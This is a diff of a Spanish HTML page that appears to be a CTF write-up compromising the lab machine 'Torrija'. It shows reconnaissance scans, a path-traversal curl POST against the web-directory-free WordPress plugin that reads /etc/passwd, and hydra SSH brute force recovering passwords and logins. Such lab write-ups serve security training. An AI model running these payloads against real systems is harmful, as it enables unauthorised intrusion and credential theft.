@@ -1,4 +1,5 @@
 <div class="w-full md:w-2/3 mx-auto">
+    <p class="my-4 text-xl">Escaneo de la red para encontrar hosts activos</p>
     <pre
         class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
         md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
@@ -15,7 +16,7 @@
     192.168.72.132  00:0c:29:20:ae:39      1      60  VMware, Inc.                                                                                                                                                                           
     192.168.72.254  00:50:56:e4:ea:5f      1      60  VMware, Inc.  
     </pre>
-
+    <p class="my-4 text-xl">Escaneo de puertos y servicios</p>
     <pre
         class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
         md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
@@ -51,7 +52,11 @@
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
     </pre>
-     
+    <p class="my-4 text-xl">Notas.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        El escaneo de puertos revela que el host tiene los puertos 22 (SSH), 80 (HTTP) y 3306 (MySQL) abiertos.
+    </p>
+    <p class="my-4 text-xl">Escaneo de vulnerabilidades</p>
     <pre
         class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
         md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
@@ -98,15 +103,343 @@
     MAC Address: 00:0C:29:20:AE:39 (VMware)
 
     Nmap done: 1 IP address (1 host up) scanned in 37.01 seconds
-</pre>
-
-<pre
+    </pre>
+    <p class="my-4 text-xl">Notas.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        Aparentemente, el escaneo de vulnerabilidades revela que el servidor web se identifican directorios
+        potencialmente interesantes relacionados con Wordpress.
+    </p>
+    <p class="my-4 text-xl">Identificación de tecnologías web</p>
+    <pre
         class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
         md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+
+    whatweb http://192.168.72.132
+
+    http://192.168.72.132 [200 OK] Apache[2.4.62], Bootstrap, Country[RESERVED][ZZ], Email[demo@gmail.com], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.72.132], JQuery[3.0.0], Script[text/javascript], Title[torrija.thl], X-UA-Compatible[IE=edge]    
+    </pre>
+    <p class="my-4 text-xl">Notas.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        El escaneo de tecnologías web revela que el servidor está utilizando Apache 2.4.62 y tiene varios componentes
+        interesantes, como Bootstrap y JQuery.
+    </p>
+    <p class="my-4 text-xl">Inspeccionamos la web y el wordpress</p>
+    <img src="/img/torrijas/torrijas_1.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        Esta es la web que corre por el puerto 80 pero no parece tener contenido relevante.
+    </p>
+    <img src="/img/torrijas/torrijas_2.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        Al acceder a la ruta /wordpress/ nos encontramos con un Wordpress donde encontramos un usuario
+        <b>"administrator"</b> en una entrada de blog.
+    </p>
+    <p class="my-4 text-xl">Escaneo de Wordpress</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    wpscan --url http://192.168.72.132/wordpress --enumerate ap,at,u --api-token ****************************
+
+        _______________________________________________________________
+            __          _______   _____
+            \ \        / /  __ \ / ____|
+            \ \  /\  / /| |__| | (___   ___  __ _ _ __ ®
+            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+                \  /\  /  | |     ____) | |__| |_| | | | |
+                \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+            WordPress Security Scanner by the WPScan Team
+                            Version 3.8.28
+        Sponsored by Automattic - https://automattic.com/
+        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+    _______________________________________________________________
+
+    [+] URL: http://192.168.72.132/wordpress/ [192.168.72.132]
+    [+] Started: Wed Jun 11 12:09:43 2025
+
+    Interesting Finding(s):
+
+    [+] Headers
+    | Interesting Entry: Server: Apache/2.4.62 (Debian)
+    | Found By: Headers (Passive Detection)
+    | Confidence: 100%
+
+    [+] XML-RPC seems to be enabled: http://192.168.72.132/wordpress/xmlrpc.php
+    | Found By: Direct Access (Aggressive Detection)
+    | Confidence: 100%
+
+    -----------------------------------------------------------------------------
+    [i] The main theme could not be detected.
+
+    [+] Enumerating All Plugins (via Passive Methods)
+
+    [i] No plugins Found.
+
+    [+] Enumerating All Themes (via Passive and Aggressive Methods)
+    Checking Known Locations - Time: 00:00:32 === (29718 / 29718) 100.00% Time: 00:00:32
+    [+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+    [i] Theme(s) Identified:
+
+    [+] twentytwentyfive
+    | Location: http://192.168.72.132/wordpress/wp-content/themes/twentytwentyfive/
+    | Last Updated: 2025-04-15T00:00:00.000Z
+    | Readme: http://192.168.72.132/wordpress/wp-content/themes/twentytwentyfive/readme.txt
+    | [!] The version is out of date, the latest version is 1.2
+    | [!] Directory listing is enabled
+    | Style URL: http://192.168.72.132/wordpress/wp-content/themes/twentytwentyfive/style.css
+    | Style Name: Twenty Twenty-Five
+    | Style URI: https://wordpress.org/themes/twentytwentyfive/
+    | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
+    | Author: the WordPress team
+    | Author URI: https://wordpress.org
+    |
+    | Found By: Known Locations (Aggressive Detection)
+    |  - http://192.168.72.132/wordpress/wp-content/themes/twentytwentyfive/, status: 200
+    |
+    | Version: 1.0 (80% confidence)
+    | Found By: Style (Passive Detection)
+    |  - http://192.168.72.132/wordpress/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'
+
+    -----------------------------------------------------------------------------
+
+    [i] User(s) Identified:
+
+    [+] administrator
+    | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+    </pre>
+    <p class="my-4 text-xl">Notas.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        Corroboramos que el usuario <b>"administrator"</b> existe y está expuesto a un ataque de fuerza bruta. En
+        principio, no hay plugins ni temas vulnerables
+        conocidos, pero el tema <b>twentytwentyfive</b> está desactualizado y tiene el directorio de listados
+        habilitado.
+    </p>
+    <p class="my-4 text-xl">Fuerza bruta al usuario administrator</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    wpscan --url http://192.168.72.132/wordpress --passwords rockyou_5000.txt --usernames administrator --force 
+
+    _______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+        \ \  /\  / /| |__| | (___   ___  __ _ _ __ ®
+        \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | |__| |_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.28
+    _______________________________________________________________
+
+    [+] URL: http://192.168.72.132/wordpress/ [192.168.72.132]
+    [+] Started: Wed Jun 11 12:19:32 2025
+
+    Interesting Finding(s):
+
+    [+] Headers
+    | Interesting Entry: Server: Apache/2.4.62 (Debian)
+    | Found By: Headers (Passive Detection)
+    | Confidence: 100%
+
+    [+] Performing password attack on Xmlrpc against 1 user/s
+    Trying administrator / 369258 Time: 00:01:57 ==> (5000 / 5000) 100.00% Time: 00:01:57
+
+    [i] No Valid Passwords Found.
+    </pre>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        El ataque de fuerza bruta al usuario administrator no tuvo éxito, ya que no se encontró ninguna contraseña
+        válida.
+    </p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">Buscando un poco de información para continuar, he conseguido
+        una lista de plugins
+        vulnerables desde un repositorio público de github, <a
+            href="https://github.com/RandomRobbieBF/wordpress-plugin-list">wordpress-plugin-list</a>
+    </p>
+    <p class="my-4 text-xl">Fuzzing con plugins vulnerables</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    wfuzz -c -w wp-plugins.lst --hc 404 http://192.168.72.132/wordpress/FUZZ
+
+    ********************************************************
+    * Wfuzz 3.1.0 - The Web Fuzzer                         *
+    ********************************************************
+
+    Target: http://192.168.72.132/wordpress/FUZZ
+    Total requests: 57720
+
+    =====================================================================
+    ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
+    =====================================================================
+
+    000002135:   200        162 L    1080 W     6489 Ch     "/wp-content/plugins/akismet/readme.txt"                                                                                                                                  
+    000048158:   200        572 L    4134 W     30402 Ch    "/wp-content/plugins/web-directory-free/readme.txt"                                                                                                                       
+
+    Total time: 31.75381
+    Processed Requests: 57720
+    Filtered Requests: 57718
+    Requests/sec.: 1817.734
+    </pre>
+    <p class="my-4 text-xl">Busqueda de información.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        En la página de WPScan encontramos una vulnerabilidad que podemos explotar del plugin web-directory-free que nos
+        permite
+        la visualización del fichero passwd. <a
+            href="https://wpscan.com/vulnerability/0e8930cb-e176-4406-a43f-a6032471debf/" target="_blank">Más
+            información aquí.</a>
+    </p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        Local File Inclusion permite a un atacante incluir archivos del sistema local del servidor a través de la
+        manipulación de entradas que no han sido debidamente validadas.
+    </p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        Este POST explota una vulnerabilidad en el plugin de WordPress.
+        La variable template no está siendo validada ni saneada, y se utiliza directamente en una función include() para
+        cargar plantillas.
+    </p>
+     <p class="my-4 text-neutral-200  text-sm md:text-base">
+    Esta es una técnica conocida como path traversal, que intenta subir niveles en el árbol de directorios
+    (../) para alcanzar archivos fuera del directorio de la aplicación web.
+    </p>
+    <img src="/img/torrijas/torrijas_3.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="my-4 text-xl">Explotación de la vulnerabilidad</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    curl -X POST http://192.168.72.132/wordpress/wp-admin/admin-ajax.php -d "from_set_ajax=1&action=w2dc_controller_request&template=../../../../../etc/passwd"
+    </pre>
+    <img src="/img/torrijas/torrijas_4.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+     <p class="my-4 text-xl">Indentado de los usuarios.</p>
+    <pre 
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+    messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+    sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+    debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
+    mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
+    primo:x:1001:1001::/home/primo:/bin/bash
+    premo:x:1002:1002::/home/premo:/bin/bash
+    </pre>
+    <p class="my-4 text-xl">Notas.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+       He conseguido listar los usuarios del sistema, entre ellos los usuarios <b>debian</b>, <b>primo</b> y <b>premo</b>.
+    </p>
+    <p class="my-4 text-xl">Fuerza bruta los usuarios</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    hydra -L userTorrijas.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.72.132 -f -V -u
+
+    Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-12 14:19:21
+    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+    [DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
+    [DATA] attacking ssh://192.168.72.132:22/
+    [ATTEMPT] target 192.168.72.132 - login "debian" - pass "123456" - 1 of 43033197 [child 0] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "primo" - pass "123456" - 2 of 43033197 [child 1] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "premo" - pass "123456" - 3 of 43033197 [child 2] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "debian" - pass "12345" - 4 of 43033197 [child 3] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "primo" - pass "12345" - 5 of 43033197 [child 4] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "premo" - pass "12345" - 6 of 43033197 [child 5] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "debian" - pass "123456789" - 7 of 43033197 [child 6] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "primo" - pass "123456789" - 8 of 43033197 [child 7] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "premo" - pass "123456789" - 9 of 43033197 [child 8] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "debian" - pass "password" - 10 of 43033197 [child 9] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "primo" - pass "password" - 11 of 43033197 [child 10] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "premo" - pass "password" - 12 of 43033197 [child 11] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "debian" - pass "iloveyou" - 13 of 43033197 [child 12] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "primo" - pass "iloveyou" - 14 of 43033197 [child 13] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "premo" - pass "iloveyou" - 15 of 43033197 [child 14] (0/0)
+    [ATTEMPT] target 192.168.72.132 - login "debian" - pass "princess" - 16 of 43033197 [child 15] (0/0)
+    [22][ssh] host: 192.168.72.132   login: debian   password: 12345
+    [STATUS] attack finished for 192.168.72.132 (valid pair found)
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-12 14:19:25
+    </pre>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        He conseguido acceder al usuario <b>debian</b> con la contraseña <b>12345</b>. 
+    </p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    ssh debian@192.168.72.132
+    The authenticity of host '192.168.72.132 (192.168.72.132)' can't be established.
+    ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
+    This key is not known by any other names.
+    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+    Warning: Permanently added '192.168.72.132' (ED25519) to the list of known hosts.
+    debian@192.168.72.132's password: 
+    Linux Torrija-TheHackersLabs 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    debian@Torrija-TheHackersLabs:~$
+    </pre>
+    <p class="my-4 text-xl">Notas.</p>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+     Con el usuario debian no podemos accceder a la primera bandera, vamos a hacer la fuera bruta con el usuario premo.
+    </p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">
+    hydra -l premo -P rockyou_5000.txt ssh://192.168.72.132 -f -V -u 
+
+    -----------------------------------------------------------------------------
     
-whatweb http://192.168.72.132
+    [ATTEMPT] target 192.168.72.132 - login "premo" - pass "mommy" - 925 of 5002 [child 1] (0/2)
+    [RE-ATTEMPT] target 192.168.72.132 - login "premo" - pass "juliana" - 925 of 5002 [child 10] (0/2)
+    [RE-ATTEMPT] target 192.168.72.132 - login "premo" - pass "cassandra" - 925 of 5002 [child 12] (0/2)
+    [22][ssh] host: 192.168.72.132   login: premo   password: cassandra
+    [STATUS] attack finished for 192.168.72.132 (valid pair found)
+    1 of 1 target successfully completed, 1 valid password found
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-12 14:40:42
+    </pre>
+    <p class="my-4 text-neutral-200  text-sm md:text-base">
+        La contraseña del usuario premo es <b>cassandra</b>.
+    </p>
+    <p class="my-4 text-xl">Acceso por ssh</p>
+    <pre
+        class="overflow-x-auto bg-neutral-900 bg-opacity-50 rounded-lg p-4 md:p-6 text-green-500 text-sm 
+        md:text-base leading-relaxed whitespace-pre-wrap scrollbar-thin scrollbar-thumb-lime-600 scrollbar-track-transparent">  
+    ssh premo@192.168.72.132 
 
-http://192.168.72.132 [200 OK] Apache[2.4.62], Bootstrap, Country[RESERVED][ZZ], Email[demo@gmail.com], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.72.132], JQuery[3.0.0], Script[text/javascript], Title[torrija.thl], X-UA-Compatible[IE=edge]    
-</pre>
+    premo@192.168.72.132's password: 
+    Linux Torrija-TheHackersLabs 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
 
+    The programs included with the Debian GNU/Linux system are free software;
+    the exact distribution terms for each program are described in the
+    individual files in /usr/share/doc/*/copyright.
+
+    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+    permitted by applicable law.
+    Last login: Thu Feb 13 20:08:49 2025 from 192.168.18.204
+    premo@Torrija-TheHackersLabs:~$ 
+    </pre>
+    <img src="/img/torrijas/torrijas_5.png" alt="" class="w-full mx-auto rounded-lg mb-4" />
+    <p class="my-4 text-center text-xl md:text-2xl"><span class="text-red-500">🚩 Bandera user capturada</span></p> 
 </div>
